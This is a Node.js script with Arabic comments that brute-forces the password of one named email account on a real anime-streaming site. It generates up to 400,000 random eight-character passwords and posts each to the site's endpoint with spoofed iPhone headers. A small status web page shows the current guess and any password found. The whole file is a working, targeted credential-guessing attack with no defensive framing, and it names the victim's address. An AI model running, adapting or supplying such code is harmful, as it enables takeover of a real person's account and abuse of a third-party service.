const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

let foundPassword = null;
let currentPassword = "";
let finished = false;

const email = "abrheem16@gmail.com";

// مولد كلمات مرور ذكي
function generateSmartPasswords(limit = 200000) {
  const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const lower = "abcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  const list = new Set();

  while (list.size < limit) {
    let upperCount = Math.floor(Math.random() * 5) + 1;
    let digitCount = Math.floor(Math.random() * 3);
    let lowerCount = 8 - upperCount - digitCount;
    if (lowerCount < 0) continue;

    let chars = [];
    for (let i = 0; i < upperCount; i++) chars.push(upper[Math.floor(Math.random() * upper.length)]);
    for (let i = 0; i < digitCount; i++) chars.push(digits[Math.floor(Math.random() * digits.length)]);
    for (let i = 0; i < lowerCount; i++) chars.push(lower[Math.floor(Math.random() * lower.length)]);

    const password = chars.sort(() => Math.random() - 0.5).join("");
    list.add(password);
  }

  return Array.from(list);
}

// دالة المحاولة
async function tryPassword(password) {
  currentPassword = password;
  console.log("🟡 Trying:", password);

  try {
    const res = await axios.post(
      "https://app.sanime.net/function/h10.php?page=addcmd",
      new URLSearchParams({
        email: email,
        password: password,
        item: JSON.stringify({ post: "TEST", id: "532", fire: false })
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://ios.sanime.net",
          "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)",
          "Referer": "https://ios.sanime.net/",
          "Connection": "keep-alive"
        },
        timeout: 5000
      }
    );

    if (res.data?.status === 1) {
      foundPassword = password;
      console.log("✅ Found password:", password);
      return true;
    }
  } catch (err) {
    console.log("⛔ Error with:", password);
  }

  return false;
}

// إطلاق التجربة
async function bruteForceStart() {
  const passwords = generateSmartPasswords(400000);

  for (let i = 0; i < passwords.length; i++) {
    if (foundPassword) break;

    const ok = await tryPassword(passwords[i]);
    if (ok) break;

    await new Promise((res) => setTimeout(res, 100)); // 10 محاولات بالثانية
  }

  finished = true;
  if (!foundPassword) {
    console.log("❌ تم الانتهاء من كل الباسوردات بدون نتيجة.");
  }
}
bruteForceStart();

// واجهة الويب
app.get("/", (req, res) => {
  let html = `
    <html>
    <head><title>Brute Status</title></head>
    <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px">
      <h1>🔐 كلمة المرور:</h1>`;

  if (foundPassword) {
    html += `<h2 style="color:#0f0">${foundPassword}</h2>`;
  } else if (finished) {
    html += `<h2 style="color:orange">❌ تم الانتهاء من جميع الباسوردات ولم يتم العثور على الباسورد الصحيح</h2>`;
  } else {
    html += `<h2>جارٍ البحث... 🌀</h2>`;
    html += `<h3>تجريب: ${currentPassword}</h3>`;
  }

  html += `</body></html>`;
  res.send(html);
});

// تشغيل السيرفر
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log("🚀 Server running on port", PORT));
